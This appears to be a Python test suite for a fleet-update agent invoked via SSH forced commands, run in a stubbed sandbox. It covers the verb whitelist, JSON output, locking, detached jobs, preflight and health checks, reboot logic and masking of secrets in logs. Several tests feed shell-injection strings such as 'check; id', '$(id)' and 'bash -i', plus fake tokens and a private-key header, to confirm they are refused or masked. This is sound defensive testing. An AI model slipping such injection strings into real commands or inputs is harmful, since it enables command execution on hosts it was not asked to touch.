#!/usr/bin/env python3
"""fleet-agent (Unix): whitelist, JSON schema v1, lock, preflight, health, detach.

The agent is exercised for real (bash) inside a sandbox: every external tool it
touches (dnf, rpm, systemctl, docker, df, logger, sudo, systemd-run, pgrep,
nmcli, needs-restarting) is replaced by a stub placed first on PATH, and every
path (state, lock, /etc, power supply, reboot flag...) is redirected through
FLEET_AGENT_* variables. Nothing here needs root, a real host or the network.

"SSH killed during update" is simulated by running the verb in its own session
and killing that whole process group right after it answered: the detached job
must keep going and `report` must then return its final state.
"""

import json
import os
import re
import shutil
import signal
import stat
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
AGENT = ROOT / "dot_local/share/fleet/agent/fleet-agent.sh"
SYSUP = ROOT / "dot_local/bin/executable_sysup"
SUDOERS_TMPL = ROOT / ".chezmoiscripts/03-configure/run_always_install-sudoers-sysup.sh.tmpl"
INSTALL_TMPL = ROOT / ".chezmoiscripts/03-configure/run_onchange_install-fleet-agent.sh.tmpl"

V1_KEYS = {
    "schema", "host", "verb", "status", "reason", "packages", "changes",
    "health_before", "health_after", "preflight", "config_conflicts", "job",
    "reboot_required", "reboot_since", "os", "kernel", "major_available",
    "started", "ended", "log_tail",
}
AGENT_STATUSES = {
    "started", "running", "updated", "up-to-date", "degraded", "failed",
    "busy", "skipped", "unsupported",
}
VERBS = ["check", "update", "reboot-status", "reboot", "report"]

STUBS = {
    # Every stub records its invocation in $STUB_DIR/calls.log.
    "logger": 'echo "$*" >> "$STUB_DIR/logger.log"\n',
    "sudo": 'echo "sudo $*" >> "$STUB_DIR/sudo.log"\n',
    "pgrep": 'echo "pgrep $*" >> "$STUB_DIR/calls.log"\nexit "${STUB_PGREP_RC:-1}"\n',
    "nmcli": 'echo "nmcli $*" >> "$STUB_DIR/calls.log"\necho "${STUB_METERED:-no}"\n',
    "docker": (
        'echo "docker $*" >> "$STUB_DIR/calls.log"\n'
        '[ -f "$STUB_DIR/docker.out" ] && cat "$STUB_DIR/docker.out"\nexit 0\n'
    ),
    "needs-restarting": 'echo "needs-restarting $*" >> "$STUB_DIR/calls.log"\nexit "${STUB_NEEDS_RESTARTING_RC:-0}"\n',
    "rpm": 'echo "rpm $*" >> "$STUB_DIR/calls.log"\n[ -f "$STUB_DIR/rpm.db" ] && cat "$STUB_DIR/rpm.db"\nexit 0\n',
    "dnf": (
        'echo "dnf $*" >> "$STUB_DIR/calls.log"\n'
        'if [ "$2" = check-update ]; then\n'
        '  i=0; while [ "$i" -lt "${STUB_DNF_PENDING:-0}" ]; do echo "pkg$i.x86_64 1.$i-1 updates"; i=$((i+1)); done\n'
        '  [ "${STUB_DNF_PENDING:-0}" -gt 0 ] && exit 100\nfi\nexit 0\n'
    ),
    "systemctl": (
        'echo "systemctl $*" >> "$STUB_DIR/calls.log"\n'
        'case "$1" in\n'
        '  --failed) [ -f "$STUB_DIR/failed.out" ] && cat "$STUB_DIR/failed.out"; exit 0 ;;\n'
        '  is-active) svc="$3"; [ -f "$STUB_DIR/down.list" ] && grep -qx "$svc" "$STUB_DIR/down.list" && exit 3; exit 0 ;;\n'
        'esac\nexit 0\n'
    ),
    "df": (
        'echo "df $*" >> "$STUB_DIR/calls.log"\n'
        'p="$2"\n'
        'echo "Filesystem 1024-blocks Used Available Capacity Mounted on"\n'
        'if [ "$p" = /boot ] && [ -n "${STUB_DF_BOOT_USE:-}" ]; then\n'
        '  echo "/dev/sda1 1000 1 1 ${STUB_DF_BOOT_USE}% /boot"\n'
        'elif [ "$p" = /boot ]; then\n'
        '  echo "/dev/sda2 1000 1 1 ${STUB_DF_ROOT_USE:-40}% /"\n'
        'else\n'
        '  echo "/dev/sda2 1000 1 1 ${STUB_DF_ROOT_USE:-40}% /"\nfi\n'
    ),
    "systemd-run": (
        'echo "$*" >> "$STUB_DIR/systemd-run.log"\n'
        'while [ "$#" -gt 0 ]; do\n'
        '  case "$1" in\n'
        '    --setenv=*) export "${1#--setenv=}" ;;\n'
        '    --) shift; break ;;\n'
        '  esac\n'
        '  shift\n'
        'done\n'
        '# Detached like a transient unit: own session, survives the caller.\n'
        'setsid "$@" >/dev/null 2>&1 </dev/null &\n'
    ),
}

SYSUP_STUB = r"""#!/usr/bin/env bash
echo "sysup $*" >> "$STUB_DIR/calls.log"
echo "started" > "$STUB_DIR/sysup.started"
echo "Updating things..."
[ -n "${STUB_SYSUP_OUTPUT:-}" ] && printf '%b\n' "$STUB_SYSUP_OUTPUT"
sleep "${STUB_SYSUP_SLEEP:-0}"
if [ -n "${STUB_RPM_AFTER:-}" ]; then printf '%b\n' "$STUB_RPM_AFTER" > "$STUB_DIR/rpm.db"; fi
if [ -n "${STUB_CREATE_FILES:-}" ]; then
  for f in $STUB_CREATE_FILES; do mkdir -p "$(dirname "$f")"; : > "$f"; done
fi
[ -n "${STUB_DOWN_AFTER:-}" ] && printf '%s\n' $STUB_DOWN_AFTER > "$STUB_DIR/down.list"
[ -n "${STUB_FAILED_AFTER:-}" ] && printf '%b\n' "$STUB_FAILED_AFTER" > "$STUB_DIR/failed.out"
echo "done" > "$STUB_DIR/sysup.finished"
exit "${STUB_SYSUP_RC:-0}"
"""

LINUX = sys.platform.startswith("linux")


class Sandbox:
    """Temp world for one test: stubs, state dir, fake /etc, fake sysfs."""

    def __init__(self):
        self.root = Path(tempfile.mkdtemp(prefix="fleet-agent-test-"))
        self.stub_dir = self.root / "stubs"
        self.bin = self.root / "bin"
        self.state = self.root / "state"
        self.etc = self.root / "etc"
        self.power = self.root / "power"
        self.modules = self.root / "modules"
        self.home = self.root / "home"
        for d in (self.stub_dir, self.bin, self.etc, self.power, self.modules, self.home):
            d.mkdir(parents=True)
        (self.modules / "6.1.0-1").mkdir()
        for name, body in STUBS.items():
            self._script(self.bin / name, "#!/usr/bin/env bash\n" + body)
        self._script(self.root / "sysup-stub", SYSUP_STUB)
        (self.root / "os-release").write_text('NAME="Debian GNU/Linux"\nVERSION_ID="12"\n')
        (self.stub_dir / "rpm.db").write_text("openssl 3.0.13-1\nbash 5.2-1\n")
        self.env = {
            **os.environ,
            "PATH": f"{self.bin}:{os.environ['PATH']}",
            "HOME": str(self.home),
            "STUB_DIR": str(self.stub_dir),
            "FLEET_AGENT_STATE_DIR": str(self.state),
            "FLEET_AGENT_SYSUP": str(self.root / "sysup-stub"),
            "FLEET_AGENT_ETC_DIR": str(self.etc),
            "FLEET_AGENT_POWER_DIR": str(self.power),
            "FLEET_AGENT_MODULES_DIR": str(self.modules),
            "FLEET_AGENT_KERNEL": "6.1.0-1",
            "FLEET_AGENT_REBOOT_FLAG": str(self.root / "reboot-required"),
            "FLEET_AGENT_CRITICAL_FILE": str(self.root / "critical-services"),
            "FLEET_AGENT_OS_RELEASE": str(self.root / "os-release"),
            "FLEET_AGENT_HOST": "testhost",
            "FLEET_AGENT_PKGMGR": "dnf",
            "FLEET_AGENT_REBOOT_DELAY": "0",
            "SSH_CONNECTION": "100.64.0.9 50000 100.64.0.1 22",
        }
        self.env.pop("SSH_ORIGINAL_COMMAND", None)

    @staticmethod
    def _script(path, body):
        path.write_text(body)
        path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    def cleanup(self):
        # Reap detached jobs before removing their files.
        for _ in range(100):
            if not (self.state / "update.lock").exists():
                break
            time.sleep(0.1)
        shutil.rmtree(self.root, ignore_errors=True)

    def run(self, command, extra_env=None, args=(), timeout=30):
        env = dict(self.env)
        env.update(extra_env or {})
        if command is None:
            env.pop("SSH_ORIGINAL_COMMAND", None)
        else:
            env["SSH_ORIGINAL_COMMAND"] = command
        return subprocess.run(
            ["bash", str(AGENT), *args], env=env, capture_output=True, text=True,
            timeout=timeout, stdin=subprocess.DEVNULL,
        )

    def json_of(self, proc):
        lines = proc.stdout.splitlines()
        assert len(lines) == 1, f"expected exactly one JSON line, got {proc.stdout!r} / {proc.stderr!r}"
        return json.loads(lines[0])

    def wait_final(self, extra_env=None, timeout=20):
        """Poll `report` until the job left started/running."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            proc = self.run("report", extra_env)
            data = self.json_of(proc)
            if data["status"] not in ("started", "running"):
                return proc, data
            time.sleep(0.2)
        raise AssertionError("update job never finished")

    def read(self, name):
        p = self.stub_dir / name
        return p.read_text() if p.exists() else ""


@unittest.skipUnless(LINUX, "agent behaviour tests stub Linux tooling")
class AgentCase(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()
        self.addCleanup(self.sb.cleanup)


class Whitelist(AgentCase):
    def assert_refused(self, command, args=()):
        proc = self.sb.run(command, args=args)
        self.assertEqual(proc.returncode, 1, (command, proc.stdout, proc.stderr))
        self.assertEqual(proc.stdout, "", "a refusal must not print a result")
        self.assertIn("REFUSED", self.sb.read("logger.log"), "refusal must be logged")
        # Nothing was executed: no package tool, no sysup, no state created.
        calls = self.sb.read("calls.log")
        self.assertNotIn("sysup", calls)
        self.assertNotIn("dnf", calls)
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists())
        self.assertFalse((self.sb.state / "jobs").exists())
        self.assertFalse((self.sb.state / "update.lock").exists())

    def test_unknown_verb(self):
        self.assert_refused("shutdown")

    def test_ping_is_not_an_agent_verb(self):
        self.assert_refused("ping")

    def test_extra_argument(self):
        self.assert_refused("check --all")

    def test_extra_argument_after_update(self):
        self.assert_refused("update foo")

    def test_shell_metacharacters(self):
        for cmd in ("check; id", "check && id", "check\nid", "$(id)", "check ", " check", "CHECK", "bash -i"):
            with self.subTest(cmd=cmd):
                self.assert_refused(cmd)

    def test_interactive_shell_attempt_has_no_command(self):
        # sshd leaves SSH_ORIGINAL_COMMAND unset for an interactive login.
        self.assert_refused(None)
        self.assert_refused("")

    def test_argv_is_refused_even_with_valid_verb(self):
        self.assert_refused("check", args=("--force",))

    def test_internal_job_entry_not_reachable_from_ssh_command(self):
        # The job runner is selected by environment, never by the command text.
        self.assert_refused("run-job")

    def test_every_verb_is_accepted(self):
        for verb in ("check", "reboot-status", "report"):
            proc = self.sb.run(verb)
            self.assertIn(proc.returncode, (0, 2), (verb, proc.stderr))
        self.assertIn("call verb=check", self.sb.read("logger.log"))

    def test_log_file_override_receives_calls_and_refusals(self):
        log = self.sb.root / "agent.log"
        self.sb.run("reboot-status", {"FLEET_AGENT_LOG_FILE": str(log)})
        self.sb.run("nope", {"FLEET_AGENT_LOG_FILE": str(log)})
        text = log.read_text()
        self.assertIn("call verb=reboot-status", text)
        self.assertIn("REFUSED", text)
        self.assertIn("client=100.64.0.9", text)

    def test_refusal_log_neutralises_control_characters(self):
        self.sb.run("evil\x1b[31m\x07text")
        self.assertNotIn("\x1b", self.sb.read("logger.log"))
        self.assertNotIn("\x07", self.sb.read("logger.log"))


class SchemaV1(AgentCase):
    def assert_v1(self, data, verb):
        self.assertEqual(set(data), V1_KEYS)
        self.assertEqual(data["schema"], 1)
        self.assertEqual(data["verb"], verb)
        self.assertIn(data["status"], AGENT_STATUSES)
        self.assertEqual(data["host"], "testhost")
        self.assertIsInstance(data["changes"], list)
        self.assertIsInstance(data["config_conflicts"], list)
        self.assertIsInstance(data["reboot_required"], bool)
        self.assertIn(data["preflight"].keys(), [{"ok", "blocked_by"}])
        for key in ("health_before", "health_after"):
            h = data[key]
            self.assertEqual(
                set(h), {"failed_units", "unhealthy_containers", "disk_free_pct", "critical_services_down"}
            )
        self.assertRegex(data["started"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertRegex(data["ended"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertLessEqual(len(data["log_tail"].splitlines()), 20)

    def test_check_up_to_date(self):
        proc = self.sb.run("check")
        data = self.sb.json_of(proc)
        self.assert_v1(data, "check")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(data["status"], "up-to-date")
        self.assertEqual(data["packages"], 0)
        self.assertEqual(data["os"], "Debian GNU/Linux 12")
        self.assertEqual(data["kernel"], "6.1.0-1")
        self.assertEqual(data["health_before"]["disk_free_pct"]["/"], 60)

    def test_check_reports_pending_without_updating(self):
        data = self.sb.json_of(self.sb.run("check", {"STUB_DNF_PENDING": "3"}))
        self.assert_v1(data, "check")
        self.assertEqual(data["packages"], 3)
        self.assertEqual(data["status"], "skipped")
        self.assertEqual(data["reason"], "updates_pending")
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists(), "check must be read-only")

    def test_check_without_package_manager_is_unsupported(self):
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "none"}))
        self.assert_v1(data, "check")
        self.assertEqual(data["status"], "unsupported")

    def test_reboot_status(self):
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assert_v1(data, "reboot-status")
        self.assertFalse(data["reboot_required"])
        self.assertIsNone(data["reboot_since"])

    def test_report_without_job(self):
        proc = self.sb.run("report")
        data = self.sb.json_of(proc)
        self.assert_v1(data, "report")
        self.assertEqual((data["status"], data["reason"]), ("skipped", "no_job"))
        self.assertEqual(proc.returncode, 0)

    def test_update_started_then_report_final(self):
        proc = self.sb.run("update", {"STUB_SYSUP_SLEEP": "1"})
        started = self.sb.json_of(proc)
        self.assert_v1(started, "update")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(started["status"], "started")
        self.assertRegex(started["job"], r"^\d{8}T\d{6}Z-\d+$")
        self.assertTrue(started["preflight"]["ok"])
        # update returned at once: sysup is still running (detached).
        running = self.sb.json_of(self.sb.run("report"))
        self.assert_v1(running, "report")
        self.assertIn(running["status"], ("started", "running"))
        self.assertEqual(running["job"], started["job"])

        proc, final = self.sb.wait_final({"STUB_RPM_AFTER": "openssl 3.0.15-1\nbash 5.2-1\nnewpkg 1.0-1"})
        # (STUB_RPM_AFTER only matters to the sysup stub inherited at launch; see below)
        self.assertIn(final["status"], ("updated", "up-to-date"))

    def test_update_final_state_lists_changes(self):
        env = {"STUB_RPM_AFTER": "openssl 3.0.15-1\nbash 5.2-1\nnewpkg 1.0-1"}
        started = self.sb.json_of(self.sb.run("update", env))
        self.assertEqual(started["status"], "started")
        proc, final = self.sb.wait_final()
        self.assert_v1(final, "report")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(final["status"], "updated")
        self.assertEqual(final["job"], started["job"])
        self.assertEqual(final["packages"], 2)
        changes = {c["name"]: c for c in final["changes"]}
        self.assertEqual(changes["openssl"], {"name": "openssl", "from": "3.0.13-1", "to": "3.0.15-1"})
        self.assertEqual(changes["newpkg"], {"name": "newpkg", "from": None, "to": "1.0-1"})
        self.assertIn("Updating things...", final["log_tail"])
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1)
        self.assertNotIn("--reboot", self.sb.read("calls.log"))
        self.assertFalse((self.sb.state / "update.lock").exists(), "lock released at the end")

    def test_update_up_to_date_when_nothing_changed(self):
        self.sb.run("update")
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "up-to-date")
        self.assertEqual(final["packages"], 0)

    def test_update_detached_through_systemd_run_user_unit(self):
        started = self.sb.json_of(self.sb.run("update"))
        self.sb.wait_final()
        log = self.sb.read("systemd-run.log")
        self.assertIn("--user", log)
        self.assertIn(f"--unit=fleet-update-{started['job']}", log)

    def test_sysup_failure_is_failed_with_exit_2(self):
        self.sb.run("update", {"STUB_SYSUP_RC": "4"})
        proc, final = self.sb.wait_final()
        self.assertEqual(final["status"], "failed")
        self.assertEqual(final["reason"], "sysup_exit_4")
        self.assertEqual(proc.returncode, 2)

    def test_missing_sysup_is_failed(self):
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(self.sb.root / "nope")})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "failed")
        self.assertEqual(final["reason"], "sysup_exit_127")


class LockAndDetach(AgentCase):
    def test_concurrent_update_is_busy_exit_3(self):
        first = self.sb.json_of(self.sb.run("update", {"STUB_SYSUP_SLEEP": "3"}))
        self.assertEqual(first["status"], "started")
        proc = self.sb.run("update")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 3)
        self.assertEqual(data["status"], "busy")
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1, "second call must not run sysup")
        self.sb.wait_final()

    def test_reboot_is_busy_during_update_and_check_reports_running(self):
        self.sb.run("update", {"STUB_SYSUP_SLEEP": "3"})
        rb = self.sb.run("reboot")
        self.assertEqual(rb.returncode, 3)
        self.assertEqual(self.sb.json_of(rb)["status"], "busy")
        chk = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(chk["status"], "running")
        self.assertEqual(self.sb.read("sudo.log"), "")
        self.sb.wait_final()

    def test_lock_is_atomic_across_simultaneous_calls(self):
        env = dict(self.sb.env, SSH_ORIGINAL_COMMAND="update", STUB_SYSUP_SLEEP="2")
        procs = [
            subprocess.Popen(["bash", str(AGENT)], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(4)
        ]
        results = [p.communicate(timeout=30) + (p.returncode,) for p in procs]
        codes = sorted(r[2] for r in results)
        self.assertEqual(codes, [0, 3, 3, 3], results)
        self.sb.wait_final()
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1)

    def test_stale_lock_of_dead_process_is_taken_over(self):
        lock = self.sb.state / "update.lock"
        lock.mkdir(parents=True)
        (lock / "pid").write_text("999999\n")
        proc = self.sb.run("update")
        self.assertEqual(self.sb.json_of(proc)["status"], "started")
        self.sb.wait_final()

    def test_ssh_killed_during_update_does_not_stop_the_job(self):
        env = dict(self.sb.env, SSH_ORIGINAL_COMMAND="update", STUB_SYSUP_SLEEP="2",
                   STUB_RPM_AFTER="openssl 3.0.15-1\nbash 5.2-1")
        # Own session = the "sshd session"; killing its group = the SSH cut.
        proc = subprocess.Popen(["bash", str(AGENT)], env=env, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True, start_new_session=True)
        line = proc.stdout.readline()
        self.assertEqual(json.loads(line)["status"], "started")
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass  # already gone: the agent returns right after launching
        proc.wait(timeout=10)
        deadline = time.time() + 15
        while time.time() < deadline and not (self.sb.stub_dir / "sysup.finished").exists():
            time.sleep(0.1)
        self.assertTrue((self.sb.stub_dir / "sysup.finished").exists(), "update was interrupted")
        # A later session asks for the outcome.
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "updated")
        self.assertEqual(final["packages"], 1)

    def test_job_killed_hard_is_reported_failed_job_died(self):
        self.sb.run("update", {"STUB_SYSUP_SLEEP": "30"})
        pid = int((self.sb.state / "update.lock" / "pid").read_text())
        deadline = time.time() + 5
        while pid == 0 and time.time() < deadline:
            time.sleep(0.1)
        # Wait for the runner to take ownership of the lock (its pid != parent's).
        for _ in range(50):
            pid = int((self.sb.state / "update.lock" / "pid").read_text())
            if (self.sb.stub_dir / "sysup.started").exists():
                break
            time.sleep(0.1)
        os.kill(pid, signal.SIGKILL)
        subprocess.run(["pkill", "-f", "sysup-stub"], check=False)
        time.sleep(0.3)
        proc = self.sb.run("report")
        data = self.sb.json_of(proc)
        self.assertEqual((data["status"], data["reason"]), ("failed", "job_died"))
        self.assertEqual(proc.returncode, 2)


class Preflight(AgentCase):
    def assert_skipped(self, reason, env=None, setup=None):
        if setup:
            setup()
        proc = self.sb.run("update", env)
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(data["status"], "skipped")
        self.assertEqual(data["reason"], reason)
        self.assertEqual(data["preflight"], {"ok": False, "blocked_by": reason})
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists(), "no update attempted")
        self.assertFalse((self.sb.state / "update.lock").exists(), "lock released")

    def test_disk_low_root(self):
        self.assert_skipped("disk_low", {"STUB_DF_ROOT_USE": "95"})

    def test_disk_low_boot(self):
        self.assert_skipped("disk_low", {"STUB_DF_BOOT_USE": "85"})

    def test_boot_with_enough_space_is_fine(self):
        data = self.sb.json_of(self.sb.run("update", {"STUB_DF_BOOT_USE": "50"}))
        self.assertEqual(data["status"], "started")
        self.sb.wait_final()

    def test_on_battery(self):
        def setup():
            bat = self.sb.power / "BAT0"
            bat.mkdir()
            (bat / "type").write_text("Battery\n")
            (bat / "status").write_text("Discharging\n")
        self.assert_skipped("on_battery", setup=setup)

    def test_battery_charging_is_fine(self):
        bat = self.sb.power / "BAT0"
        bat.mkdir()
        (bat / "type").write_text("Battery\n")
        (bat / "status").write_text("Charging\n")
        data = self.sb.json_of(self.sb.run("update"))
        self.assertEqual(data["status"], "started")
        self.sb.wait_final()

    def test_metered_network(self):
        self.assert_skipped("metered_network", {"STUB_METERED": "yes"})

    def test_package_manager_running(self):
        self.assert_skipped("update_in_progress", {"STUB_PGREP_RC": "0"})

    def test_check_exposes_the_same_preflight(self):
        data = self.sb.json_of(self.sb.run("check", {"STUB_DF_ROOT_USE": "95", "STUB_DNF_PENDING": "1"}))
        self.assertEqual(data["preflight"], {"ok": False, "blocked_by": "disk_low"})


class HealthAndConflicts(AgentCase):
    def critical(self, *names):
        Path(self.sb.env["FLEET_AGENT_CRITICAL_FILE"]).write_text("# comment\n" + "\n".join(names) + "\n")

    def test_critical_service_down_after_update_is_degraded(self):
        self.critical("nginx", "kvmd")
        self.sb.run("update", {"STUB_DOWN_AFTER": "nginx"})
        proc, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_before"]["critical_services_down"], [])
        self.assertEqual(final["health_after"]["critical_services_down"], ["nginx"])
        self.assertIn("nginx", final["reason"])
        self.assertEqual(proc.returncode, 0)

    def test_new_failed_unit_is_degraded_but_existing_one_is_not(self):
        (self.sb.stub_dir / "failed.out").write_text("old.service loaded failed failed Old\n")
        self.sb.run("update", {"STUB_FAILED_AFTER": "old.service loaded failed failed Old\nnew.service loaded failed failed New"})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_before"]["failed_units"], ["old.service"])
        self.assertEqual(final["health_after"]["failed_units"], ["new.service", "old.service"])
        self.assertIn("new.service", final["reason"])
        self.assertNotIn("old.service", final["reason"])

    def test_preexisting_failure_alone_is_not_degraded(self):
        (self.sb.stub_dir / "failed.out").write_text("old.service loaded failed failed Old\n")
        self.sb.run("update")
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "up-to-date")

    def test_unhealthy_container_after_update_is_degraded(self):
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": ""})
        self.sb.wait_final()
        # Same flow with a container turning unhealthy: docker output changes.
        (self.sb.stub_dir / "docker.out").write_text("web|Up 2 minutes (unhealthy)\ndb|Up 2 minutes (healthy)\nold|Exited (0) 3 days ago\n")
        data = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(data["health_before"]["unhealthy_containers"], ["old", "web"])

    def test_container_unhealthy_only_after(self):
        # Make the sysup stub flip docker's output.
        flip = self.sb.root / "sysup-flip"
        flip.write_text(
            "#!/usr/bin/env bash\n"
            'printf "web|Up 1 minute (unhealthy)\\n" > "$STUB_DIR/docker.out"\n'
        )
        flip.chmod(0o755)
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(flip)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_after"]["unhealthy_containers"], ["web"])

    def test_low_disk_after_update_is_degraded(self):
        flip = self.sb.root / "sysup-full"
        flip.write_text("#!/usr/bin/env bash\ntouch \"$STUB_DIR/full\"\n")
        flip.chmod(0o755)
        df = self.sb.bin / "df"
        df.write_text(
            "#!/usr/bin/env bash\n"
            'use=40; [ -f "$STUB_DIR/full" ] && use=95\n'
            'echo "Filesystem 1K Used Avail Cap Mounted"\n'
            'echo "/dev/sda2 1000 1 1 ${use}% /"\n'
        )
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(flip)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertIn("disk", final["reason"])

    def test_config_conflicts_are_listed(self):
        files = [
            self.sb.etc / "ssh/sshd_config.rpmnew",
            self.sb.etc / "default/grub.dpkg-dist",
            self.sb.etc / "pacman.conf.pacnew",
        ]
        (self.sb.etc / "ssh").mkdir(parents=True)
        (self.sb.etc / "ssh/sshd_config").write_text("x")
        self.sb.run("update", {"STUB_CREATE_FILES": " ".join(str(f) for f in files)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["config_conflicts"], sorted(str(f) for f in files))
        self.assertEqual(final["status"], "up-to-date", "a conflict does not fail the update")

    def test_config_conflicts_in_check(self):
        (self.sb.etc / "a.dpkg-dist").write_text("")
        (self.sb.etc / "regular.conf").write_text("")
        data = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(data["config_conflicts"], [str(self.sb.etc / "a.dpkg-dist")])

    def test_log_tail_is_limited_and_secrets_masked(self):
        lines = "\\n".join(f"line {i}" for i in range(40))
        secrets = (
            "\\ntoken=hunter2supersecret"
            "\\nAuthorization: Bearer abcdef"
            "\\nkey tk_ABCDEFGHIJKLMNOPQRSTUVWX end"
            "\\njwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig"
            "\\n-----" + "BEGIN OPENSSH PRIV" + "ATE KEY-----"
            "\\nPASSWORD: p4ss"
        )
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": lines + secrets})
        _, final = self.sb.wait_final()
        tail = final["log_tail"]
        self.assertLessEqual(len(tail.splitlines()), 20)
        for leaked in ("hunter2", "abcdef", "tk_ABCDEF", "eyJhbGci", "BEGIN OPENSSH", "p4ss"):
            self.assertNotIn(leaked, tail)
        self.assertIn("[MASKED", tail)
        self.assertNotRegex(json.dumps(final), r"BEGIN [A-Z ]*PRIVATE KEY|tk_[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{20,}\.")


class RebootVerbs(AgentCase):
    def test_flag_file_means_required_with_since(self):
        Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"]).write_text("*** System restart required ***\n")
        first = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertTrue(first["reboot_required"])
        self.assertEqual(first["reason"], "reboot_required")
        self.assertRegex(first["reboot_since"], r"^\d{4}-")
        second = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(second["reboot_since"], first["reboot_since"], "since is stable until reboot")

    def test_needs_restarting_rc1_means_required(self):
        data = self.sb.json_of(self.sb.run("reboot-status", {"STUB_NEEDS_RESTARTING_RC": "1"}))
        self.assertTrue(data["reboot_required"])

    def test_newer_kernel_installed_means_required(self):
        (self.sb.modules / "6.2.5-300").mkdir()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertTrue(data["reboot_required"])

    def test_older_kernel_dir_does_not_require_reboot(self):
        (self.sb.modules / "5.14.0-1").mkdir()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertFalse(data["reboot_required"])

    def test_since_cleared_once_no_longer_required(self):
        flag = Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"])
        flag.write_text("x")
        self.sb.run("reboot-status")
        flag.unlink()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertIsNone(data["reboot_since"])

    def test_reboot_does_nothing_when_not_required(self):
        proc = self.sb.run("reboot")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual((data["status"], data["reason"]), ("skipped", "no_reboot_required"))
        time.sleep(0.5)
        self.assertEqual(self.sb.read("sudo.log"), "", "must not call sudo")

    def test_reboot_when_required_uses_the_exact_sudo_command(self):
        Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"]).write_text("x")
        proc = self.sb.run("reboot")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual((data["status"], data["reason"]), ("started", "rebooting"))
        for _ in range(50):
            if self.sb.read("sudo.log"):
                break
            time.sleep(0.1)
        self.assertEqual(self.sb.read("sudo.log").strip(), "sudo -n /usr/bin/systemctl reboot")


@unittest.skipUnless(shutil.which("chezmoi"), "chezmoi needed to render the install template")
class InstallScript(unittest.TestCase):
    """Render the chezmoi install template and run it against stubs (no sudo, no op)."""

    KEY_A = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA masterA@host"
    KEY_B = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"

    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="fleet-install-"))
        self.addCleanup(shutil.rmtree, self.root, True)
        self.bin = self.root / "bin"
        self.home = self.root / "home"
        self.bin.mkdir()
        self.home.mkdir()
        env = dict(os.environ, CHEZMOI_ASSUME_SUDO="1")
        rendered = subprocess.run(
            ["chezmoi", "execute-template", "--source", str(ROOT)],
            input=INSTALL_TMPL.read_text(), env=env, capture_output=True, text=True, timeout=60,
        )
        self.assertEqual(rendered.returncode, 0, rendered.stderr)
        self.script = self.root / "install.sh"
        self.script.write_text(rendered.stdout)
        self._stub("sudo", 'echo "sudo $*" >> "$STUB_DIR/sudo.log"\n'
                           'case "$1" in cmp) exit 1 ;; stat) echo "root:root 755" ;; esac\nexit 0\n')
        self._stub("loginctl", 'echo "loginctl $*" >> "$STUB_DIR/sudo.log"\necho no\n')
        self._stub("op", 'echo "op $*" >> "$STUB_DIR/op.log"\n'
                         'f="$STUB_DIR/op-$(basename "$2")"\n[ -f "$f" ] && { cat "$f"; exit 0; }\nexit 1\n')
        self.env = dict(os.environ, PATH=f"{self.bin}:{os.environ['PATH']}", HOME=str(self.home),
                        STUB_DIR=str(self.root))

    def _stub(self, name, body):
        p = self.bin / name
        p.write_text("#!/usr/bin/env bash\n" + body)
        p.chmod(0o755)

